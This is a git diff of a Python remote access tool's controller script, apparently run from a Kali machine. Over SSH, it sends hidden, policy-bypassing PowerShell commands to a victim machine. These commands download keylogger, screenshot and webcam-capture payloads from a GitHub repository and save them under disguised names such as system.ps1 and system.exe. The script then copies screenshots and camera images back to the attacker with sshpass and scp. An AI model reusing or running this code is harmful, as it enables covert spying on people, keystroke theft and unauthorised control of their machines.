@@ -63,7 +63,7 @@ def run_command(address, username, password, command):
     
 def payloads(address, username, password, temp, startup):
     print("[*] Starting install payloads ...")
-    payload_keylogger = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/payloads/keylogger.ps1' -OutFile '{startup}/system.ps1'\""
+    payload_keylogger = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/payloads/keylogger.ps1' -OutFile '{temp}/happy/system.ps1'\""
     payload_screenshot = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/payloads/screenshot.ps1' -OutFile '{temp}/happy/system32.ps1'\""
     payload_camera = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/payloads/CommandCam.exe' -OutFile '{temp}/happy/system.exe'\""
     payload_control_camera = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/payloads/control_cam.ps1' -OutFile '{temp}/happy/coltrol_system.ps1'\""
@@ -97,6 +97,7 @@ def screenshot(address, username, password, temp, startup):
     
 def take_screenshot(address, username, password, path):
     os.system(f"sshpass -p \"{password}\" scp {username}@{address}:{path}/sad/happy.png /home/kali/Downloads")
+    print("[+] Downloaded Successful ...")
 
 def control_camera(address, username, password, temp, startup):
     print("[*] Starting control camera ...")
@@ -108,6 +109,7 @@ def take_camera_picture(address, username, password, path):
     os.system(f"sshpass -p \"{password}\" scp {username}@{address}:{path}/happy/image.bmp /home/kali/Downloads")
     run_control = f"start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {path}/happy/control_system.ps1"
     run_command(address, username, password, run_control)
+    print("[+] Downloaded Successful ...")
     
     
 def terminated():
